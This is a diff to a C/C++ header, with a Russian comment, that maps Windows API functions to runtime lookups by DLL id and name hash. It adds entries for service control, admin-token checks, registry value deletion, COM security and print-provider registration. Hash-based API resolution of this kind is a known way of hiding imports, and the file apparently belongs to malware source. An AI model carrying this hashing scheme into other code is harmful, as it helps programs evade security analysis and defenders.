@@ -47,7 +47,8 @@ enum TDllId
 	DLL_COMANDLG32 = 22,  /* commdlg32_dll */
 	DLL_ODBC32	   = 23,  /* odbc32_dll */
 	DLL_VERSION    = 24,  /* version.dll */
-	DLL_OLE32      = 25   /* ole32.dll */
+	DLL_OLE32      = 25,  /* ole32.dll */
+	DLL_IMAGEHLP   = 26   /* Imagehlp.dll */	
 };
 
 
@@ -387,6 +388,8 @@ const static int ApiCacheSize = 0;
 #define pGetDriveTypeA				pushargEx< DLL_KERNEL32, 0x399354CE>
 #define pInterlockedIncrement		pushargEx< DLL_KERNEL32, 0xD03C6D18>
 #define pInterlockedDecrement		pushargEx< DLL_KERNEL32, 0xDD2A6D18>
+#define pFlushViewOfFile			pushargEx< DLL_KERNEL32, 0x664FD32B>
+#define pGetExitCodeProcess			pushargEx< DLL_KERNEL32, 0xFDC94385>
 
 //advapi32
 #define pCreateProcessAsUserA		pushargEx< DLL_ADVAPI32, 0x985267C4>
@@ -437,6 +440,13 @@ const static int ApiCacheSize = 0;
 #define pCryptDecrypt    	    	pushargEx< DLL_ADVAPI32, 0xCEBF17E6>
 #define pCryptSetKeyParam   		pushargEx< DLL_ADVAPI32, 0x37A53419>
 #define pCryptDestroyKey    		pushargEx< DLL_ADVAPI32, 0xD4B3D42>
+#define pControlService				pushargEx< DLL_ADVAPI32, 0x5FFEE3F1>
+#define pQueryServiceStatusEx		pushargEx< DLL_ADVAPI32, 0xF6C712F4>
+#define pRegDeleteValueA			pushargEx< DLL_ADVAPI32, 0x560c7c4a>
+#define pCloseServiceHandle			pushargEx< DLL_ADVAPI32, 0x78CEC357>
+#define pAllocateAndInitializeSid	pushargEx< DLL_ADVAPI32, 0x28E9E291>
+#define pCheckTokenMembership		pushargEx< DLL_ADVAPI32, 0x87FEDB50>
+#define pFreeSid					pushargEx< DLL_ADVAPI32, 0x5CB5EF72>
 
 //user32
 #define pExitWindowsEx 				pushargEx< DLL_USER32, 0xAD7043A4>
@@ -616,6 +626,7 @@ const static int ApiCacheSize = 0;
 #define pRtlImageDirectoryEntryToData pushargEx< DLL_NTDLL, 0x503f7b28>
 #define pZwQueryInformationFile		pushargEx< DLL_NTDLL, 0x0f7ba4b7>
 #define pZwShutdownSystem			pushargEx< DLL_NTDLL, 0x6F1C809E>
+#define pRtlComputeCrc32			pushargEx< DLL_NTDLL,0x687B7023>
 
 
 
@@ -721,15 +732,15 @@ const static int ApiCacheSize = 0;
 #define pGetModuleBaseNameA			pushargEx< DLL_PSAPI, 0x7353EFE8>
 #define pGetModuleFileNameExA		pushargEx< DLL_PSAPI, 0xE4FB2191>
 
-
-
-
+#define pGetProcessImageFileNameA	pushargEx<DLL_PSAPI, 0x2741105>
 
 
 //
 //shlwapi.dll
 #define	pPathFindFileNameA			pushargEx< DLL_SHLWAPI, 0xeed5398c>
+#define pPathFindFileNameW			pushargEx< DLL_SHLWAPI, 0xEED5399A>
 #define pPathCombineA				pushargEx< DLL_SHLWAPI, 0x45B615D5>
+#define pPathCombineW				pushargEx< DLL_SHLWAPI, 0x45b615c3>
 #define pStrStrA					pushargEx< DLL_SHLWAPI, 0x2A7C76E6>
 #define pPathRemoveFileSpecA		pushargEx< DLL_SHLWAPI, 0xE6E3EE01>
 #define pStrToIntA					pushargEx< DLL_SHLWAPI, 0xAAD270E7>
@@ -767,8 +778,17 @@ const static int ApiCacheSize = 0;
 
 // ole32.dll
 #define pCoCreateGuid				pushargEx< DLL_OLE32, 0xAA3E88A3>
+#define pCoInitializeEx				pushargEx<DLL_OLE32, 0x7573DE28>
+#define pCoUninitialize				pushargEx<DLL_OLE32, 0xEDB3159D>
+#define pCoCreateInstance			pushargEx<DLL_OLE32, 0x368435BE>
+#define pCoInitializeSecurity		pushargEx<DLL_OLE32, 0x910EACB3>
 
+//winspool.drv
+#define pAddPrintProvidorA			pushargEx<DLL_WINSPOOL, 0x4B12B4DF>
+#define pDeletePrintProvidorA		pushargEx<DLL_WINSPOOL, 0x3D369C42>
 
+//imagehlp
+#define pCheckSumMappedFile			pushargEx<DLL_IMAGEHLP, 0xd5edc5a2>
 
 //****************************************************************
 //  Вспомогательные функции
